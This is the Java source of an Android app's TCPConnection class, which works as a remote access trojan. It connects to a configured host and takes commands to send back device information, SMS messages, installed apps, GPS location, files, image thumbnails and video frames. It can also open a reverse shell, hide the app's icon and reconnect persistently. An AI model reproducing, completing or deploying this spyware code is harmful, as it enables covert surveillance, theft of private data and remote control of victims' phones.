package com.example.remoteapp;

import android.annotation.SuppressLint;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaMetadataRetriever;
import android.media.ThumbnailUtils;
import android.net.Uri;
import android.os.Build;
import android.os.StrictMode;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnSuccessListener;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;

public class TCPConnection  extends AppCompatActivity implements Runnable {

    LocationManager locationManager;

    String host = Config.HOST;
    int port = Config.PORT;
    String SH_PATH = Config.SHELL_PATH;
    Socket socket;
    private final int SMS_CODE = 100;
    private static final int PERMISSION_SEND_SMS = 123;
    private static boolean shellOn = false;
    private boolean smsPerms;

    private FusedLocationProviderClient fusedLocationClient;
    private String passwd;

    private int unHideRequest;

    private final Actions xpl = new Actions();
    DataOutputStream toServer = null;
    BufferedReader fromServer = null;


    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public void run()
    {
        unHideRequest=0;
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
        startReverseShell(host, port);
    }

    public  void stopConnection()
    {
        socket = null;
    }

    private boolean checkSmsPerms()
    {
        if (smsPerms) return true;
        return false;
    }

    private  boolean sendFile(File f, String src)
    {
        try {
            toServer.writeBytes("_send-file_\n");
            toServer.flush();
            Thread.sleep(375);
            toServer.writeBytes("_file-length_=>" + f.length() + "&&" + src + "\n");
            try {
                byte[] bytes = new byte[(int) f.length()];
                BufferedInputStream bis;
                bis = new BufferedInputStream(new FileInputStream(f));
                bis.read(bytes, 0, bytes.length);
                Thread.sleep(1555);
                toServer.write(bytes, 0, bytes.length);
            } catch (Exception e) {
                toServer.writeBytes("download-error_=>" + e.getMessage() + "\n");
                toServer.flush();
                return false;
            }
            toServer.flush();
            toServer.writeBytes("downloaded_success\n");
            toServer.flush();
            if (f.exists()) f.delete();
            return true;
        }catch (Exception e){
            e.printStackTrace();
            return false;
        }
    }

    public void setSmsPerms(boolean perm) { smsPerms = perm;  }

    public void setPassword(String pass) { passwd = pass; }

    public String getPassword() { return passwd != null ? passwd : ""; }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public void startReverseShell(String host, int port) {
        boolean run = true;
        try {
            InetAddress address = InetAddress.getByName(host);
            socket = new Socket(address, port);
            toServer = new DataOutputStream(socket.getOutputStream());
            fromServer = new BufferedReader(new InputStreamReader(socket.getInputStream(), StandardCharsets.UTF_8));
            String sysInfo = "_system_info=>=>" + xpl.deviceInfo() + "\n";
            toServer.write(sysInfo.getBytes(StandardCharsets.UTF_8));
            toServer.flush();
            String command = "";
            while (!socket.isClosed()) {
                try {
                    command = fromServer.readLine();
                } catch (Exception e) {
                  e.printStackTrace();
                }
                if (TextUtils.isEmpty(command)) {
                    toServer.close();
                    fromServer.close();
                    socket.close();
                    break;
                }

                if (command.equalsIgnoreCase("_close_shell_")) {
                    shellOn = false;
                    continue;
                }

                if (command.contains("_get-dirs_")) {
                    String r = "";
                    String paths = xpl.getInterestingPaths() + "\n";
                    try {
                        toServer.write(paths.getBytes());
                        toServer.flush();
                    } catch (Exception e) {
                        e.getStackTrace();
                    }
                }

                if (command.equalsIgnoreCase("_getshell_")) {
                    if (executeShell(SH_PATH, socket, toServer)) {
                        /*DONOTHING*/
                    } else {
                        toServer.writeBytes("_error_starting_shell_" + "\n");
                    }
                }

                if (command.contains("_get__sms_") && command.contains("-")) {
                    String type = command.split("-")[2];
                    String sTxt = "";
                    String msjs = "";
                    if (type.equals("1")) {
                        msjs = xpl.readSMSBox("inbox");
                        sTxt = "[>]smsin:,_,,_" + msjs;
                    }
                    if (type.equals("2")) {
                        msjs = xpl.readSMSBox("sent");
                        sTxt = "[>]smssent:,_,,_" + msjs;
                    }
                    if (type.equals("3")) {
                        msjs = xpl.readSMSBox("Outbox");
                        sTxt = "[>]smsout_:,_,,_" + msjs;
                    }
                    toServer.writeUTF(sTxt + "\n");
                }

                if (command.equalsIgnoreCase("_get-apps_")) {
                    String apps = xpl.getInstalledApps();
                    toServer.writeBytes(apps + "\n");
                    toServer.flush();
                }


                if (command.contains("send_sms_=>")) {
                    try {
                        String number = command.split("_=>")[1].split("&&&")[0];
                        String msj = command.split("_=>")[1].split("&&&")[1];
                        SmsManager smsManager = SmsManager.getDefault();
                    }catch (Exception e){
                       e.printStackTrace();
                    }
                }

                if (command.contains("get_video_frame_=>")) {
                    String vidN = command.split("_=>")[1].split("&&")[0];
                    if (!vidN.isEmpty() && (vidN.contains(".mp4") || vidN.contains(".avi") || vidN.contains(".3gp") || vidN.contains(".WMV") || vidN.contains(".mov") || vidN.contains(".mkv") || vidN.contains(".flv"))) {
                        File ft = new File(vidN);
                        if (ft.exists()) {
                            MediaMetadataRetriever retriever = new MediaMetadataRetriever();
                            retriever.setDataSource(this, Uri.fromFile(ft));
                            String time = retriever.extractMetadata(MediaMetadataRetriever.METADATA_KEY_DURATION);
                            //long durationMs = Long.parseLong(time);
                            long durationMicroSec= Long.parseLong(time)*1000;
                            retriever.release();
                            ArrayList<String> framesSrc = Actions.getVideoFramesThumbs(vidN, durationMicroSec, this);
                            for (String src : framesSrc) {
                                try {
                                    File f = new File(src);
                                    if (f.exists() && f.isFile())
                                        sendFile(f,src);
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                            }

                        }
                    }

                }


                if (command.equalsIgnoreCase("..etc..")) {

                }


                if (command.equalsIgnoreCase("_get_geo_")) {
                    try {
                      getAndSendLocation();
                    }catch (Exception e){
                        e.printStackTrace();
                    }
                }

                if (command.equalsIgnoreCase("_hide_app_")) {
                    try {
                        xpl.hideAppIcon( MainActivity.getAppContext() );
                    }catch (Exception e){
                        e.printStackTrace();
                    }
                }

                if (command.contains("_download-file_=>")){
                    String filePath = command.split("_=>")[1];
                    if (!filePath.isEmpty()) {
                        File f = new File(filePath);
                        if (f.exists() && f.isFile()) {
                            toServer.writeBytes("_send-file_\n");
                            toServer.flush();
                            toServer.writeBytes("_file-length_=>>" + f.length() + "&&" + filePath + "\n");
                            try {
                                byte[] bytes = new byte[(int) f.length()];
                                BufferedInputStream bis;
                                bis = new BufferedInputStream(new FileInputStream(f));
                                bis.read(bytes, 0, bytes.length);
                                Thread.sleep(4345);
                                toServer.write(bytes, 0, bytes.length);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            toServer.flush();
                            toServer.writeBytes("downloaded_success\n");
                            toServer.flush();
                        }
                    }
                }

                if (command.contains("_get_thumbs_=>")) {
                    String imgPath = command.split("_=>")[1];
                    if (!imgPath.isEmpty() && !imgPath.contains("thumb_") && (imgPath.contains(".jpg") || imgPath.contains(".png") || imgPath.contains(".webp") || imgPath.contains(".bmp"))) {
                        File ft = new File(imgPath);
                        if (ft.exists()) {
                            String[] parts = imgPath.split("/");
                            String thumbPath = parts[parts.length - 1];
                            parts[parts.length - 1] = "thumb_" + parts[parts.length - 1];
                            thumbPath = TextUtils.join("/", parts);
                            try {
                                final int THUMBSIZE = 120;
                                Bitmap thumbImage = ThumbnailUtils.extractThumbnail(BitmapFactory.decodeFile(imgPath), THUMBSIZE, THUMBSIZE);
                                OutputStream stream = new FileOutputStream(thumbPath);
                                thumbImage.compress(Bitmap.CompressFormat.JPEG, 99, stream);
                                File f = new File(thumbPath);
                                if (f.exists() && f.isFile()) {
                                    toServer.writeBytes("_send-file_\n");
                                    toServer.flush();
                                    Thread.sleep(355);
                                    toServer.writeBytes("_file-length_=>" + f.length() + "&&" + thumbPath + "\n");
                                    try {
                                        byte[] bytes = new byte[(int) f.length()];
                                        BufferedInputStream bis;
                                        bis = new BufferedInputStream(new FileInputStream(f));
                                        bis.read(bytes, 0, bytes.length);
                                        Thread.sleep(1555);
                                        toServer.write(bytes, 0, bytes.length);
                                    } catch (Exception e) {
                                      e.printStackTrace();
                                    }
                                    toServer.flush();
                                    toServer.writeBytes("downloaded_success\n");
                                    toServer.flush();
                                    Path delete = Paths.get(thumbPath);
                                    Files.delete(delete);
                                    if (f.exists()) f.delete();
                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                                toServer.writeBytes("download-error_=>" + e.getMessage() + "\n");
                                toServer.flush();
                                e.printStackTrace();
                            }
                        }
                    }
                }
            }
            int a =0;
        } catch (IOException e) {
            e.printStackTrace();
            retry();
        } finally {
            try {
                if (toServer != null) toServer.close();
                if (fromServer != null) fromServer.close();
                retry();
            } catch (Exception e) {;
                e.printStackTrace();
            }
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private void retry() {
        try {
            Thread.sleep(15000);
        } catch (InterruptedException e1) {
            e1.printStackTrace();
        } finally {
            startReverseShell(host, port);
        }
    }



    public static boolean executeShell(String SH_PATH, final Socket sock, DataOutputStream toServer) throws IOException {
        Process shell;
        try {
            shell = new ProcessBuilder(SH_PATH).redirectErrorStream(true).start();
        } catch (IOException e) {
            System.out.println("Failed to start \"" + SH_PATH + "\": " + e);
            return false;
        }
        shellOn = true;
        toServer.write("_shell_ok_\n".getBytes());
        InputStream pis, pes, sis;
        OutputStream pos, sos;
        Process su = Runtime.getRuntime().exec("pwd");
        StringBuilder strOut = new StringBuilder();
        pis = shell.getInputStream();
        pes = shell.getErrorStream();
        sis = sock.getInputStream();
        pos = shell.getOutputStream();
        sos = sock.getOutputStream();
        while (!sock.isClosed() && shellOn) {
            try {
                while (pis.available() > 0) {
                    sos.write(pis.read());
                }
                while (pes.available() > 0) {
                    sos.write(pes.read());
                }
                while (sis.available() > 0) {
                    int x = sis.read();
                    pos.write(x);
                    strOut.append(x);
                }
                //read  bytes from command or input received
                // 959910811111510195115104101108108951:  contiene  "_close_shell_"
                if (strOut.length() > 4) {
                    if (strOut.toString().contains("959910811111510195115104101108108951") ||  !shellOn) {
                        shellOn = false; break;
                    }
                }
                strOut.delete(0, 10000);
                sos.flush();
                pos.flush();
            } catch (IOException e) {
                e.printStackTrace();
                shell.destroy();
                return false;
            }
            try {
                Thread.sleep(50);
            } catch (InterruptedException e) {
                System.out.println("Thread sleep catch");
            }
            try {
                shell.exitValue();
                break;
            } catch (IllegalThreadStateException e) { }
        }
        toServer.write("_shutdownshell_\n".getBytes());
        shell.destroy();
        return true;
    }


    @SuppressLint("MissingPermission")
    public void  getAndSendLocation()
    {
        try {
            if( !MainActivity.locationManager.isProviderEnabled( LocationManager.GPS_PROVIDER ) ){
                try {
                    toServer.writeBytes("__geo__::>>DISABLED_BY_USER" + "\n");
                    toServer.flush();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }else{
                fusedLocationClient = LocationServices.getFusedLocationProviderClient(MainActivity.getThis2());
                if(fusedLocationClient != null){
                    fusedLocationClient.getCurrentLocation(LocationRequest.PRIORITY_HIGH_ACCURACY, null).addOnSuccessListener(MainActivity.getThis2(), new OnSuccessListener<Location>() {
                        @Override
                        public void onSuccess(Location location) {
                            if (location != null) {
                                String finalLoc = location.getLatitude()+","+location.getLongitude();
                                try {
                                    toServer.writeBytes("__geo__::>>"+finalLoc + "\n");
                                    toServer.flush();
                                } catch (IOException e) {
                                    throw new RuntimeException(e);
                                }
                            }else{
                                Log.i("FINAL_LOC", "LOCATION:_NULL" );
                            }
                        }
                    });
                }else{
                    System.out.println(" ## -->  fusedLocationCLient NULL  <-- ##");
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

}
